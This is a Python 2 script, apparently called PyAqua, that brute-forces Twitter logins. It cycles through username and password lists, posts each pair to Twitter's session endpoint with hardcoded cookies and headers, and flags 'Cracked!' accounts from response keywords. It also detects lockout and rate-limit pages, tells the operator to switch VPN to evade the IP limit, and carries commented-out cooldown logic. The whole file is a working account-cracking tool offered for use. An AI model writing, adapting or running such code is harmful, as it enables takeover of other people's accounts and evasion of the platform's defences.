
# Authenticate Query Unification Application
# Wayne Kenney - 2015                                   
#  _____                 ___     ___ 
# |  _  |___ _ _ ___ ___|_  |   |   |
# |     | . | | | .'|___|_| |_ _| | |
# |__|__|_  |___|__,|   |_____|_|___|
#         |_|                        
# By Pythogen

# Frame.py:

#Modules
import requests
from random import randint
import time
from itertools import islice
from tqdm import tqdm

#Program Information
print '\nPyAqua-1.0 - Requests Module Prototype\nBy Pythogen'

uname = 'a'
pwd = 'a'
inc = 0
aPlace = 0
bPlace = 3

#Main Routine.
def main():

	#Enable access to variables ANYWHERE
	global USERNAME
	global PASSWORD
	global login_URL
	global page
	global landing
	global keyword
	global keyword2
	global keyword3
	global keyword4
	global keyword5
	global attempts
	import time
	global uname
	global pwd

	#Site's Name (Banner)
	Service = ('Twitter - Login [Working]'
				'\n\n Cracker Activated.. ')
	#Login URL
	login_URL = 'https://twitter.com/sessions'
	#login_URL redirected to after login_URL containing keyword
	landing = 'https://twitter.com/'
	#The keyword that indicates successful login_URL detection
	keyword = 'Verify your identity'
	# Successful Login
	keyword2 = 'Add emoji'
	# Another Successful Login
	keyword3 = 'Your account has been locked'
	# Login Attempt Overload Indicator
	keyword4 = 'Yikes! We need'
	# Checkpoint - Broken username
	keyword5 = 'We detected unusual'

	#Display Banner
	print '\n%s\n' % (Service)

#Go to main 
main()

#Console prompt after successful login
def cpPrompt():

	#Command line Construct. Add commands here..
	while(True):

		#Listen for command input
		cmd = raw_input('%s>' % (USERNAME))

		#Command Construct
		if cmd == '?':
			#Show list of commands
			print '\n- who (Users Online)\n- quit\n'
		elif cmd == 'who':
			#Call function to extract data between tags. Function name included in var for global access
			print '\n' + find_between( processReq.page.content,"Online: (<strong>","</strong>)" ) + '\n'
		elif cmd == 'quit':
			quit()
			
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def processReq():
	global inc
	global aPlace
	global bPlace

	# For usernames
	text_file = open("list.txt", "r")

	text_file2 = open("pw.txt", "r")

	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_file2.read().split('\n')

		# Username cycle
		for u in USERNAME:
			# Password cycle (Only first three words)
			for p in PASSWORD[aPlace:bPlace]:
			
				# Print process
				uname = u
				pwd = p
				#print '\n%s:%s' % (u,p)

				# 1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				#POST Login data
				login_data = \
				{
					'session[username_or_email]':uname,
					'session[password]':pwd,
					'scribe_log':'',
					'redirect_after_login':'/',
					'authenticity_token':'9ddeb53ea993dbf86b0af9ec2b8cdee5bbe4ece1',
					'remember_me':'1'
				}

				#Header data
				header_data = \
				{
					'authority':'twitter.com',
					'method':'POST',
					'path':'/sessions',
					'scheme':'https',
					'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'accept-encoding':'gzip, deflate, br',
					'accept-language':'en-US,en;q=0.9',
					'cache-control':'max-age=0',
					'content-length':'953',
					'content-type':'application/x-www-form-urlencoded',
					'cookie':'syndication_guest_id=v1%3A149513189229263369; moments_profile_moments_nav_tooltip_self=true; __utmz=43838368.1500976289.1.1.utmcsr=dramaalert.com|utmccn=(referral)|utmcmd=referral|utmcct=/; eu_cn=1; tfw_exp=0; kdt=EVzvIIL5j6Q3jRDPCI08zHTEhTMywZYGLbQZWmt7; remember_checked_on=1; _ga=GA1.2.803078726.1494815446; __utma=43838368.803078726.1494815446.1513538522.1513992563.6; dnt=1; personalization_id="v1_7gxCPhntXzC/ULKOMrGc5g=="; guest_id=v1%3A151591773023026534; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCHH0NRZhAToMY3NyZl9p%250AZCIlZjNiYTQ5NjExM2E3YzZiZDU0N2ZhMmQ1NjQyMDVjN2E6B2lkIiVjMWEy%250AZjQzMTM3YmM1MTMxMDQ5MmU5YjczNjA4ZDc2Mg%253D%253D--ce106ff13230a909bbb5dcade84e4790a4ff4fb2; ct0=c39b20d67905131d4437012ce2f2e54f; _gid=GA1.2.1770201502.1516496108; gt=954879940293513216; _gat=1',
					'origin':'https://twitter.com',
					'referer':'https://twitter.com/login/error?username_or_email=fazerug&redirect_after_login=%2F',
					'upgrade-insecure-requests':'1',
					'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'
				}

				# 2) Submit POST data. Initialize login
				processReq.page = c.post(login_URL, data=login_data, headers=header_data)

				# 4) Looking for keyword indicating successful login
				Check = processReq.page.content.find(keyword)
				Check2 = processReq.page.content.find(keyword2)
				Check3 = processReq.page.content.find(keyword3)
				Check4 = processReq.page.content.find(keyword4)
				Check5 = processReq.page.content.find(keyword5)
				#print processReq.page.content

				if Check == -1 and Check2 == -1 and Check3 == -1: 
					
					if Check5 == -1:
						# Don't do anything
						pass
					else:
						print '[ '+ uname + ' : ' + pwd + '] - END! '
						print "Broken username detected..."
						x = raw_input("You've reached your checkpoint! Configure now...")

					if Check4 == -1:
						print '[ '+ uname + ' : ' + pwd + ']'

						# Delay Configuration. Increment until 60,
						inc = inc + 1
						#Login success. Go to command console

					else:
						print "Load up the VPN."
						x = raw_input("[IP Rated]")

				else:
						print '[ '+ uname + ' : ' + pwd + '] - Cracked! '
						x = raw_input("Cracked. Press enter to exit")

					#print 'login failed. (Try again)'
					#print processReq.page.content


					# [ After every 60 attempts... ]
				#	if inc % 60 == 0:

						# Delete Three Lines
				#		lines = open('pw.txt').readlines()
					#	open('pw.txt', 'w').writelines(lines[3:-1])

				#		print "\n[Please wait for 10 minute cool down...]\n"

						# [ Delay for 10 minutes and then repeat... ]
				#		time.sleep(600)

			#switch users
			#print "\n[ user switch ]\n"

		#password switch
			#print "\n[ password switch ] \n"

		#reach end of sequence

		#Enable new list feature

		aPlace = aPlace + 3
		bPlace = bPlace + 3
		processReq()

#Process Auth Details
processReq()